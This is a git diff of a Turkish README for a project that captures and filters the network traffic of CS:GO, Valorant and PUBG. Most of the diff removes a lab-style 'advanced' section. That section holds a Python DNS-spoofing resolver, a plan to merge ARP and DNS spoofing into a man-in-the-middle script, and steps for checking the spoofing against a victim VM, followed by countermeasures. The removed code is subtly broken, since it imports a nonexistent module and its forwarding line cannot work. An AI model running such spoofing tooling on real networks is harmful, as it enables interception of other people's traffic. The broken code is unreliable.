@@ -77,64 +77,11 @@ kullanıcıların kendi analizlerini yapabileceği etkileşimli bir araç veya m
 ```
  1. CS:GO, Valorant ve PUBG için kapsamlı ve detaylı pcap yakalama senaryolarının tamamlanması.
  2. Wireshark yakalama ve görüntüleme filtrelerinin her oyun için optimize edilmesi ve nihai hale getirilmesi.
- 3. researchs klasörü altındaki her bir oyunun ağ analizi (örn. csgo_network_analysis.md, valorant_network_analysis.md) ve Wireshark filtreleri (wireshark_filters.md) hakkındaki Markdown dosyalarının içeriğinin detaylıca doldurulması.
+ 3. researchs klasörü altındaki her bir oyunun ağ analizi (örn. csgo_network_analysis.md, valorant_network_analysis.md)
+ ve Wireshark filtreleri (wireshark_filters.md) hakkındaki Markdown dosyalarının içeriğinin detaylıca doldurulması.
  4. Projenin Python ile ilgili tüm bağımlılıklarını (eğer varsa) doğru bir şekilde listeleyen requirements.txt dosyasının oluşturulması ve güncel tutulması.
 ```
 
-## Gelişmiş Geliştirmeler
-
-### Seçmeli DNS Spoofing için DNS Proxy
-DNSChef gibi belirli alan adlarını spoof eden bir DNS sunucusu oluşturun.
-
-1. dnslib’i kurun: `pip install dnslib`
-2. DNS proxy betiği:
-
-```python
-from dnslib import *
-from dnslib.server import DNSServer, DNSHandler, BaseResolver
-import dns.resolv
-
-class SpoofResolver(BaseResolver):
-    def resolve(self, request, handler):
-        reply = request.reply()
-        qname = str(request.q.qname)
-        if qname in ['example.com.']:
-            reply.add_answer(RR(qname, QTYPE.A, rdata=A('192.168.1.100'), ttl=60))
-        else:
-            # Gerçek DNS’e yönlendirme
-            reply = DNSRecord.parse(dns.resolv.Resolver().query(request.q.qname, request.q.qtype).send())
-        return reply
-
-resolver = SpoofResolver()
-server = DNSServer(resolver, port=53, address='0.0.0.0')
-server.start_thread()
-```
-
-### Entegre MITM Betiği
-Bettercap benzeri bir betikle ARP ve DNS spoofing’i birleştirin.
-
-1. Yukarıdaki ARP ve DNS spoofing kodlarını birleştirin.
-2. Yapılandırma dosyası veya komut satırı argümanlarıyla özelleştirin.
-
-## Geliştirmelerin Test Edilmesi
-1. **ARP Spoofing**:
-   - Betiği çalıştırın.
-   - Kurban VM’de ARP tablosunu kontrol edin (`arp -a`); ağ geçidinin MAC adresi saldırganınkiyle değişmiş olmalı.
-2. **DNS Spoofing**:
-   - Betiği çalıştırın.
-   - Kurban VM’de bir alan adı çözümleyin (ör. `nslookup example.com`); sahte IP dönmeli.
-3. **DHCP Manipülasyonu**:
-   - Betiği çalıştırın.
-   - Kurban VM’de IP kirasını yenileyin (`ipconfig /renew` veya `dhclient`); DNS sunucusu sahte IP olmalı.
-4. **Sahte Web Sunucusu**:
-   - Kurban VM’den sahte domaine erişin; sahte sayfa görüntülenmeli.
-
-## Karşı Önlemler ve En İyi Uygulamalar
-- **Statik ARP Girişleri**: ARP spoofing’i önler.
-- **DNSSEC**: DNS sorgularını doğrular.
-- **HTTPS Kullanımı**: Sertifika uyarılarına dikkat edin.
-- **VPN**: Trafiği şifreler ve yerel manipülasyonları engeller.
-- **İzole Test Ortamı**: Üretim ağlarında test yapmayın.
-
-## Sonuç
-Bu yol haritası, Python ile DNS spoofing özelliklerini geliştirmeyi ve test etmeyi adım adım açıklamıştır. Etik ve yasal sorumluluklara bağlı kalarak, bu bilgileri siber güvenliği güçlendirmek için kullanmaya devam edin.
+## 6. Katkıda Bulunma
+Bu proje açık kaynaklıdır ve katkılara açıktır. Eğer projenin gelişimine yardımcı olmak isterseniz, lütfen CONTRIBUTING.md 
+dosyasını inceleyin veya bir sorun (Issue) oluşturarak bizimle iletişime geçin. Her türlü katkı (kod, dokümantasyon, hata raporu, fikir) değerlidir.
